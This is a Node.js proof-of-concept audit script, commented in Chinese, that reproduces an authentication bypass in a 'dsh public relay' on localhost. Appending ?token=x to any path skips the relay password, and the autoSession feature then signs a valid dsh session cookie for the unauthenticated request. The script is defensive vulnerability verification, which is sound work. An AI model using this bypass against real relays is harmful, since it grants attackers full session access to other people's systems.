#!/usr/bin/env node
/**
 * audit-token-bypass.mjs — 验证「?token= 认证绕过」能否升级为完整 dsh 会话泄露
 *
 * 假设：authGate 里 isDshTokenExchange() 只看「URL 有没有 token 参数」就放行，
 * 于是未认证攻击者只要给任意路径拼一个 ?token=x，就能越过中转口令直达 dsh。
 * 再叠加 autoSession（默认开，用于「只输口令就进入」），中转还会替他补签
 * 合法的 dsh 会话 Cookie —— 那就等于无条件拿到 dsh 的全部权限。
 */
import http from 'node:http';
import { createRelay } from '../dsh-public-relay/lib/relay.js';
import { normalizeConfig } from '../dsh-public-relay/lib/config.js';
import { createSessionSigner } from '../dsh-public-relay/lib/dsh-cookie.js';

const signer = createSessionSigner({ credentialsFile: 'C:/Users/LIU/.dsh/.credentials.yaml' });

const up = http.createServer((req, res) => {
  const hasSession = /dsh-auth-[A-Za-z0-9_-]+=v1\./.test(String(req.headers.cookie || ''));
  up.seen.push({ url: req.url, hasSession });
  if (hasSession) {
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end(JSON.stringify({ ok: true, LEAKED: 'full dsh session' }));
  } else {
    res.writeHead(401, { 'content-type': 'text/plain' });
    res.end('dsh web authentication required');
  }
});
up.seen = [];
await new Promise((r) => up.listen(0, '127.0.0.1', r));
const upPort = up.address().port;
const relayPort = await new Promise((r) => {
  const s = http.createServer();
  s.listen(0, '127.0.0.1', () => { const p = s.address().port; s.close(() => r(p)); });
});

const relay = createRelay({
  getDshEndpoint: () => ({ host: '127.0.0.1', port: upPort }),
  getConfig: () => normalizeConfig({ listenPort: relayPort, password: 'SECRET-PW', autoSession: true }),
  log: () => {},
  sessionSigner: signer,
});
await relay.start();

function get(path) {
  return new Promise((res) => {
    const req = http.request({ host: '127.0.0.1', port: relayPort, path, method: 'GET' }, (r) => {
      let b = '';
      r.on('data', (c) => { b += c; });
      r.on('end', () => res({ status: r.statusCode, body: b }));
    });
    req.on('error', (e) => res({ status: 0, body: e.message }));
    req.end();
  });
}

console.log('配置：口令已设置 + autoSession 开启（这是推荐/默认配置）');
console.log('');
const a = await get('/api/session.list?token=attacker-guess');
console.log(`攻击者（无 relay cookie，只加 ?token=x）→ ${a.status} ${a.body.slice(0, 70)}`);
console.log(`上游收到的 cookie 里含合法 dsh 会话：${up.seen[0] ? up.seen[0].hasSession : 'n/a'}`);
console.log('');
if (a.status === 200 && a.body.includes('LEAKED')) {
  console.log('*** 已复现：未认证攻击者获得完整 dsh 访问权 ***');
  process.exitCode = 2;
} else {
  console.log('未复现（可能 autoSession 未生效）');
}

await relay.stop();
up.close();
process.exit();
